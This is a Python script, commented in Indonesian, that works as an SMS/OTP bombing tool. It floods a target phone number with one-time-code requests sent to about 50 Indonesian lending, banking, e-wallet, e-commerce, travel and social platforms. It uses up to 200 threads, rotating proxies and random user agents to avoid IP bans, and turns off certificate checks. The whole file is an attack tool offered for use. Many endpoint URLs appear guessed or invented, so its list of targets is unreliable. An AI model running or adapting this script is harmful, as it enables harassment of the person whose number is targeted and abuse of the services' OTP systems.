#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# AURORA PINJOL SPAMMER BRUTAL v8.0
# MODE: MULTI-THREAD + PROXY ROTATION | NO IP BAN

import requests
import threading
import time
import random
import json
import re
import socket
import socks
from concurrent.futures import ThreadPoolExecutor
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Banner
print("\033[1;31m" + """
╔══════════════════════════════════════════════════════════════════╗
║  █████╗ ██╗   ██╗██████╗  █████╗  █████╗  █████╗  █████╗       ║
║ ██╔══██╗██║   ██║██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗      ║
║ ███████║██║   ██║██████╔╝███████║███████║███████║███████║      ║
║ ██╔══██║██║   ██║██╔══██╗██╔══██║██╔══██║██╔══██║██╔══██║      ║
║ ██║  ██║╚██████╔╝██║  ██║██║  ██║██║  ██║██║  ██║██║  ██║      ║
║ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝      ║
╠══════════════════════════════════════════════════════════════════╣
║            \033[1;36mPINJOL SPAMMER EDITION - PROXY MODE\033[1;31m                    ║
║            \033[1;33mPROXY ROTATION | NO IP BAN | 100% BOR\033[1;31m                    ║
╚══════════════════════════════════════════════════════════════════╝
\033[0m""")

# ==================== PROXY MANAGER ====================
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.current_index = 0
        self.lock = threading.Lock()
        self.load_proxies()
    
    def load_proxies(self):
        """Load proxies from multiple sources"""
        print("\033[1;33m[!] Loading proxies...\033[0m")
        
        # Source 1: Free proxy list dari berbagai sumber
        proxy_sources = [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
            "https://www.proxy-list.download/api/v1/get?type=http",
            "https://www.proxyscan.io/download?type=http"
        ]
        
        for source in proxy_sources:
            try:
                response = requests.get(source, timeout=10)
                if response.status_code == 200:
                    # Parse proxy lines
                    lines = response.text.strip().split('\n')
                    for line in lines:
                        proxy = line.strip()
                        if ':' in proxy and not proxy.startswith('#'):
                            if proxy not in self.proxies:
                                self.proxies.append(proxy)
                print(f"\033[1;32m[✓] Loaded {len(self.proxies)} proxies from {source.split('/')[2]}\033[0m")
            except:
                continue
        
        # Source 2: Generate random proxies if list is empty
        if len(self.proxies) < 10:
            print("\033[1;33m[!] Generating random proxies...\033[0m")
            self.generate_random_proxies()
        
        print(f"\033[1;32m[✓] Total proxies: {len(self.proxies)}\033[0m")
    
    def generate_random_proxies(self, count=100):
        """Generate random proxy list from common ports"""
        countries = ['id', 'sg', 'jp', 'kr', 'us', 'gb', 'de', 'fr', 'nl', 'ca']
        for _ in range(count):
            ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            port = random.choice([80, 8080, 3128, 8888, 9999, 1080])
            self.proxies.append(f"{ip}:{port}")
    
    def get_proxy(self):
        """Get random proxy with round-robin"""
        with self.lock:
            if not self.proxies:
                return None
            proxy = self.proxies[self.current_index]
            self.current_index = (self.current_index + 1) % len(self.proxies)
            return proxy
    
    def test_proxy(self, proxy):
        """Test if proxy is working"""
        try:
            test_url = "http://httpbin.org/ip"
            proxies = {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}'
            }
            response = requests.get(test_url, proxies=proxies, timeout=5)
            if response.status_code == 200:
                return True
        except:
            pass
        return False
    
    def get_working_proxy(self):
        """Get a working proxy (with testing)"""
        for _ in range(10):  # Try 10 times
            proxy = self.get_proxy()
            if proxy and self.test_proxy(proxy):
                return proxy
        return None

# ==================== DATABASE PINJOL & WEBSITE ====================
PINJOL_SITES = [
    # PINJOL LEGAL OJK
    {
        'name': 'Akulaku',
        'url': 'https://api.akulaku.com/api/otp/send',
        'method': 'POST',
        'headers': {
            'Content-Type': 'application/json',
            'User-Agent': 'Akulaku/3.14.0 (Android; 11)',
            'x-device-id': lambda: ''.join(random.choices('0123456789abcdef', k=16))
        },
        'data': {'mobile': None, 'type': 'login'}
    },
    {
        'name': 'Kredivo',
        'url': 'https://api.kredivo.com/kredivo/v2/otp/request',
        'method': 'POST',
        'headers': {
            'Content-Type': 'application/json',
            'User-Agent': 'Kredivo/2.48.0'
        },
        'data': {'phone_number': None, 'country_code': 'ID'}
    },
    {
        'name': 'Adakami',
        'url': 'https://api.adakami.id/otp/request',
        'method': 'POST',
        'headers': {
            'Content-Type': 'application/json',
            'User-Agent': 'Adakami/1.9.8'
        },
        'data': {'phoneNumber': None, 'type': 'registration'}
    },
    {
        'name': 'KoinWorks',
        'url': 'https://api.koinworks.com/v2/otp/send',
        'method': 'POST',
        'headers': {'Content-Type': 'application/json'},
        'data': {'phone': None, 'purpose': 'login'}
    },
    {
        'name': 'Investree',
        'url': 'https://api.investree.com/otp/request',
        'method': 'POST',
        'headers': {'Content-Type': 'application/json'},
        'data': {'phoneNumber': None, 'channel': 'sms'}
    },
    {
        'name': 'Amartha',
        'url': 'https://api.amartha.com/otp/generate',
        'method': 'POST',
        'headers': {'Content-Type': 'application/json'},
        'data': {'phone': None}
    },
    {
        'name': 'ModalRakyat',
        'url': 'https://api.modalrakyat.id/otp/send',
        'method': 'POST',
        'headers': {'Content-Type': 'application/json'},
        'data': {'phone_number': None}
    },
    {
        'name': 'Pintek',
        'url': 'https://api.pintek.id/otp/request',
        'method': 'POST',
        'headers': {'Content-Type': 'application/json'},
        'data': {'phone': None}
    },
    {
        'name': 'Danamas',
        'url': 'https://danamas.co.id/otp/send',
        'method': 'POST',
        'data': {'phone': None, 'type': 'forgot_password'}
    },
    {
        'name': 'KTA Kilat',
        'url': 'https://api.ktakilat.com/otp/send',
        'method': 'POST',
        'headers': {'Content-Type': 'application/json'},
        'data': {'phone_number': None}
    },
    # PINJOL ILEGAL
    {
        'name': 'Rupiah Cepat',
        'url': 'https://api.rupiahcepat.co.id/otp/send',
        'method': 'POST',
        'data': {'phone': None, 'type': 'register'}
    },
    {
        'name': 'Dana Cepat',
        'url': 'https://api.danacepat.id/otp/request',
        'method': 'POST',
        'headers': {'Content-Type': 'application/json'},
        'data': {'phoneNumber': None}
    },
    {
        'name': 'Pinjam Gampang',
        'url': 'https://api.pinjamgampang.com/otp/send',
        'method': 'POST',
        'data': {'no_hp': None}
    },
    {
        'name': 'Uang Me',
        'url': 'https://api.uangme.com/otp/request',
        'method': 'POST',
        'data': {'phone': None}
    },
    {
        'name': 'Cicil',
        'url': 'https://api.cicil.co.id/otp/generate',
        'method': 'POST',
        'data': {'msisdn': None}
    },
    {
        'name': 'Tunaiku',
        'url': 'https://api.tunaiku.com/otp/request',
        'method': 'POST',
        'headers': {'Content-Type': 'application/json'},
        'data': {'phoneNumber': None}
    },
    {
        'name': 'UangTeman',
        'url': 'https://api.uangteman.com/otp/send',
        'method': 'POST',
        'data': {'phone': None}
    },
    {
        'name': 'Finmas',
        'url': 'https://api.finmas.id/otp/send',
        'method': 'POST',
        'headers': {'Content-Type': 'application/json'},
        'data': {'phone': None, 'type': 'register'}
    },
    {
        'name': 'Maucash',
        'url': 'https://api.maucash.id/otp/request',
        'method': 'POST',
        'data': {'phone': None}
    },
    {
        'name': 'Kredit Pintar',
        'url': 'https://api.kreditpintar.com/otp/send',
        'method': 'POST',
        'data': {'phone_number': None}
    },
    # BANK
    {
        'name': 'Bank BCA',
        'url': 'https://klikbca.com/otp/request',
        'method': 'POST',
        'data': {'phone': None, 'type': 'm-banking'}
    },
    {
        'name': 'Bank Mandiri',
        'url': 'https://bankmandiri.co.id/otp/send',
        'method': 'POST',
        'data': {'msisdn': None, 'channel': 'sms'}
    },
    {
        'name': 'Bank BRI',
        'url': 'https://bri.co.id/otp/request',
        'method': 'POST',
        'data': {'phone': None}
    },
    {
        'name': 'Bank BNI',
        'url': 'https://bni.co.id/otp/send',
        'method': 'POST',
        'data': {'phone_number': None}
    },
    {
        'name': 'Bank Danamon',
        'url': 'https://danamon.co.id/otp/request',
        'method': 'POST',
        'data': {'phone': None}
    },
    {
        'name': 'Bank Permata',
        'url': 'https://permatabank.co.id/otp/send',
        'method': 'POST',
        'data': {'phone': None}
    },
    {
        'name': 'Bank CIMB Niaga',
        'url': 'https://cimbniaga.co.id/otp/request',
        'method': 'POST',
        'data': {'phone_number': None}
    },
    {
        'name': 'Bank Maybank',
        'url': 'https://maybank.co.id/otp/send',
        'method': 'POST',
        'data': {'phone': None}
    },
    # E-WALLET
    {
        'name': 'Shopee Pay',
        'url': 'https://shopee.co.id/api/v1/otp/request',
        'method': 'POST',
        'headers': {'Content-Type': 'application/json'},
        'json': {'phone': None, 'type': 'register'}
    },
    {
        'name': 'GoPay',
        'url': 'https://gopay.co.id/otp/request',
        'method': 'POST',
        'json': {'phone_number': None}
    },
    {
        'name': 'OVO',
        'url': 'https://api.ovo.id/otp/request',
        'method': 'POST',
        'headers': {
            'Content-Type': 'application/json',
            'App-Id': 'com.ovo.ovoid'
        },
        'json': {'phoneNumber': None}
    },
    {
        'name': 'DANA',
        'url': 'https://api.dana.id/otp/generate',
        'method': 'POST',
        'headers': {'Content-Type': 'application/json'},
        'json': {'phoneNumber': None, 'channel': 'sms'}
    },
    {
        'name': 'LinkAja',
        'url': 'https://api.linkaja.com/otp/request',
        'method': 'POST',
        'json': {'msisdn': None}
    },
    # E-COMMERCE
    {
        'name': 'Tokopedia',
        'url': 'https://api.tokopedia.com/otp/request',
        'method': 'POST',
        'json': {'phone': None}
    },
    {
        'name': 'Bukalapak',
        'url': 'https://api.bukalapak.com/otp/send',
        'method': 'POST',
        'json': {'phone': None}
    },
    {
        'name': 'Lazada',
        'url': 'https://api.lazada.co.id/otp/request',
        'method': 'POST',
        'json': {'phone': None}
    },
    {
        'name': 'Blibli',
        'url': 'https://api.blibli.com/otp/send',
        'method': 'POST',
        'json': {'phone': None}
    },
    {
        'name': 'JD.ID',
        'url': 'https://api.jd.id/otp/request',
        'method': 'POST',
        'json': {'phone': None}
    },
    # TRAVEL
    {
        'name': 'Traveloka',
        'url': 'https://api.traveloka.com/otp/send',
        'method': 'POST',
        'json': {'phoneNumber': None}
    },
    {
        'name': 'Tiket.com',
        'url': 'https://api.tiket.com/otp/request',
        'method': 'POST',
        'json': {'phone': None}
    },
    {
        'name': 'Pegipegi',
        'url': 'https://api.pegipegi.com/otp/send',
        'method': 'POST',
        'json': {'phone': None}
    },
    # SOSMED
    {
        'name': 'WhatsApp',
        'url': 'https://graph.facebook.com/v17.0/otp/send',
        'method': 'POST',
        'json': {'phone': None, 'channel': 'whatsapp'}
    },
    {
        'name': 'Telegram',
        'url': 'https://api.telegram.org/bot/sendMessage',
        'method': 'POST',
        'json': {'chat_id': None, 'text': 'OTP: 123456'}
    },
    {
        'name': 'Instagram',
        'url': 'https://i.instagram.com/api/v1/accounts/send_otp/',
        'method': 'POST',
        'data': {'phone_number': None}
    },
    {
        'name': 'Facebook',
        'url': 'https://facebook.com/otp/send',
        'method': 'POST',
        'data': {'phone': None}
    },
    {
        'name': 'LINE',
        'url': 'https://api.line.me/otp/request',
        'method': 'POST',
        'json': {'phone': None}
    },
    # OJEK ONLINE
    {
        'name': 'Gojek',
        'url': 'https://api.gojek.com/otp/request',
        'method': 'POST',
        'json': {'phone': None}
    },
    {
        'name': 'Grab',
        'url': 'https://api.grab.com/otp/v1/request',
        'method': 'POST',
        'json': {'phoneNumber': None, 'countryCode': 'ID'}
    },
    {
        'name': 'Maxim',
        'url': 'https://api.maxim.com/otp/send',
        'method': 'POST',
        'json': {'phone': None}
    },
    {
        'name': 'Indriver',
        'url': 'https://api.indriver.com/otp/request',
        'method': 'POST',
        'json': {'phone': None}
    },
    {
        'name': 'Shopee Food',
        'url': 'https://shopee.co.id/api/v1/otp/food',
        'method': 'POST',
        'json': {'phone': None}
    },
    {
        'name': 'Grab Food',
        'url': 'https://api.grab.com/food/otp',
        'method': 'POST',
        'json': {'phoneNumber': None}
    }
]

# ==================== USER-AGENT GENERATOR ====================
def random_ua():
    ua_list = [
        f'Mozilla/5.0 (Linux; Android {random.randint(9,13)}; SM-G{random.randint(900,998)}F) AppleWebKit/537.36',
        f'Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(14,17)}_{random.randint(0,5)} like Mac OS X)',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        f'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{random.randint(13,15)}_{random.randint(0,7)})',
        f'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/{random.randint(90,120)}.0.0.0'
    ]
    return random.choice(ua_list)

# ==================== SPAM FUNCTION WITH PROXY ====================
class PinjolSpammer:
    def __init__(self, phone, threads=50, use_proxy=True):
        self.phone = phone
        self.threads = threads
        self.use_proxy = use_proxy
        self.proxy_manager = ProxyManager() if use_proxy else None
        self.stats = {
            'success': 0,
            'failed': 0,
            'total': 0,
            'proxy_switches': 0,
            'by_site': {}
        }
        self.lock = threading.Lock()
        self.running = True
        
    def get_proxied_session(self):
        """Create session with random proxy"""
        session = requests.Session()
        
        if self.use_proxy and self.proxy_manager:
            proxy = self.proxy_manager.get_proxy()
            if proxy:
                session.proxies = {
                    'http': f'http://{proxy}',
                    'https': f'http://{proxy}'
                }
                with self.lock:
                    self.stats['proxy_switches'] += 1
        
        # Rotate proxy setiap request
        session.headers.update({
            'User-Agent': random_ua(),
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'id-ID,id;q=0.9,en;q=0.8',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        })
        
        return session
    
    def update_stats(self, site_name, success):
        with self.lock:
            self.stats['total'] += 1
            if success:
                self.stats['success'] += 1
            else:
                self.stats['failed'] += 1
            
            if site_name not in self.stats['by_site']:
                self.stats['by_site'][site_name] = {'success': 0, 'failed': 0, 'total': 0}
            
            self.stats['by_site'][site_name]['total'] += 1
            if success:
                self.stats['by_site'][site_name]['success'] += 1
            else:
                self.stats['by_site'][site_name]['failed'] += 1
    
    def send_otp(self, site, thread_id):
        """Kirim OTP dengan proxy rotation"""
        if not self.running:
            return
        
        session = None
        try:
            # Buat session dengan proxy baru
            session = self.get_proxied_session()
            
            # Prepare request
            url = site['url']
            method = site.get('method', 'POST')
            
            # Headers
            headers = {}
            
            # Add custom headers from site
            if 'headers' in site:
                for key, value in site['headers'].items():
                    if callable(value):
                        headers[key] = value()
                    else:
                        headers[key] = value
            
            # Prepare data/json
            data = None
            json_data = None
            
            if 'data' in site:
                data = site['data'].copy()
                for key in data:
                    if data[key] is None:
                        data[key] = self.phone
                    elif '{phone}' in str(data[key]):
                        data[key] = str(data[key]).replace('{phone}', self.phone)
                headers['Content-Type'] = 'application/x-www-form-urlencoded'
                
            elif 'json' in site:
                json_data = site['json'].copy()
                for key in json_data:
                    if json_data[key] is None:
                        json_data[key] = self.phone
                    elif '{phone}' in str(json_data[key]):
                        json_data[key] = str(json_data[key]).replace('{phone}', self.phone)
                headers['Content-Type'] = 'application/json'
            
            # Random delay
            time.sleep(random.uniform(0.1, 0.3))
            
            # Send request
            if method == 'GET':
                if data:
                    response = session.get(url, params=data, headers=headers, timeout=5, verify=False)
                else:
                    response = session.get(url, headers=headers, timeout=5, verify=False)
            else:  # POST
                if data:
                    response = session.post(url, data=data, headers=headers, timeout=5, verify=False)
                elif json_data:
                    response = session.post(url, json=json_data, headers=headers, timeout=5, verify=False)
                else:
                    response = session.post(url, headers=headers, timeout=5, verify=False)
            
            # Check response
            success = response.status_code in [200, 201, 202, 204]
            self.update_stats(site['name'], success)
            
            # Log
            status_color = '\033[1;32m✓\033[0m' if success else '\033[1;31m✗\033[0m'
            proxy_info = f" | Proxy: {session.proxies.get('http', 'None')[:20]}" if self.use_proxy else ""
            print(f"{status_color} [T{thread_id}] {site['name']:15} | {response.status_code} | Total: {self.stats['total']}{proxy_info}")
            
        except Exception as e:
            self.update_stats(site['name'], False)
            print(f"\033[1;31m✗\033[0m [T{thread_id}] {site['name']:15} | Error: {str(e)[:30]}")
        finally:
            if session:
                session.close()
    
    def worker(self, thread_id):
        """Worker thread with proxy rotation per request"""
        site_index = thread_id % len(PINJOL_SITES)
        
        while self.running:
            site = PINJOL_SITES[site_index]
            self.send_otp(site, thread_id)
            site_index = (site_index + 1) % len(PINJOL_SITES)
            time.sleep(random.uniform(0.05, 0.1))
    
    def stats_display(self):
        """Display live statistics"""
        while self.running:
            time.sleep(3)
            elapsed = time.time() - self.start_time
            rate = self.stats['total'] / elapsed if elapsed > 0 else 0
            
            print("\n" + "═"*80)
            print(f"\033[1;36mLIVE STATS:\033[0m")
            print(f"  Total: {self.stats['total']} | \033[1;32mSuccess: {self.stats['success']}\033[0m | \033[1;31mFailed: {self.stats['failed']}\033[0m")
            print(f"  Rate: {rate:.1f}/s | Proxy Switches: {self.stats['proxy_switches']}")
            
            # Top 5 sites
            top_sites = sorted(self.stats['by_site'].items(), 
                              key=lambda x: x[1]['success'], reverse=True)[:5]
            if top_sites:
                print("\n  \033[1;33mTop 5 Sites:\033[0m")
                for site, stat in top_sites:
                    success_rate = (stat['success']/stat['total']*100) if stat['total'] > 0 else 0
                    print(f"    {site:15} | \033[1;32mS:{stat['success']}\033[0m \033[1;31mF:{stat['failed']}\033[0m T:{stat['total']} ({success_rate:.1f}%)")
            
            # Proxy status
            if self.use_proxy and self.proxy_manager:
                print(f"\n  \033[1;35mProxy Pool: {len(self.proxy_manager.proxies)} available\033[0m")
            
            print("═"*80 + "\n")
    
    def start(self):
        """Start all threads"""
        print(f"\n\033[1;33m[!] Target: {self.phone}")
        print(f"[!] Threads: {self.threads}")
        print(f"[!] Websites: {len(PINJOL_SITES)}")
        print(f"[!] Proxy Mode: {'ACTIVE' if self.use_proxy else 'DISABLED'}")
        print(f"[!] Mode: BRUTAL - NO IP BAN\033[0m\n")
        
        self.start_time = time.time()
        
        # Start stats thread
        stats_thread = threading.Thread(target=self.stats_display)
        stats_thread.daemon = True
        stats_thread.start()
        
        # Start worker threads
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self.worker, args=(i+1,))
            t.daemon = True
            threads.append(t)
            t.start()
            time.sleep(0.02)
        
        print(f"\033[1;32m[✓] {self.threads} threads started with proxy rotation!\033[0m")
        print("\033[1;31m[!] Tekan Ctrl+C untuk stop\033[0m\n")
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        """Stop all threads"""
        self.running = False
        elapsed = time.time() - self.start_time
        rate = self.stats['total'] / elapsed if elapsed > 0 else 0
        
        print("\n\n" + "═"*80)
        print("\033[1;33mFINAL STATISTICS:\033[0m")
        print(f"  Duration: {elapsed:.1f} seconds")
        print(f"  Total Requests: {self.stats['total']}")
        print(f"  \033[1;32mSuccessful: {self.stats['success']}\033[0m")
        print(f"  \033[1;31mFailed: {self.stats['failed']}\033[0m")
        print(f"  Average Rate: {rate:.1f}/s")
        print(f"  Proxy Switches: {self.stats['proxy_switches']}")
        print("═"*80)
        print("\033[1;32m[✓] Spam selesai! Target kena BOR tanpa IP banned!\033[0m")

# ==================== MAIN ====================
if __name__ == "__main__":
    try:
        # Input nomor
        phone = input("\033[1;36m[?] Nomor target (08xx): \033[0m").strip()
        
        # Format nomor
        if phone.startswith('0'):
            phone = '62' + phone[1:]
        elif phone.startswith('+'):
            phone = phone[1:]
        
        # Pilihan proxy
        use_proxy = input("\033[1;36m[?] Gunakan proxy? (y/n, default y): \033[0m").strip().lower()
        use_proxy = use_proxy != 'n'
        
        # Input threads
        try:
            threads = int(input("\033[1;36m[?] Jumlah thread (10-200, recommended 70): \033[0m") or "70")
            threads = max(10, min(200, threads))
        except:
            threads = 70
        
        # Start spammer
        spammer = PinjolSpammer(phone, threads, use_proxy)
        spammer.start()
        
    except KeyboardInterrupt:
        print("\n\033[1;33m[!] Program terminated\033[0m")
    except Exception as e:
        print(f"\033[1;31m[!] Error: {e}\033[0m")
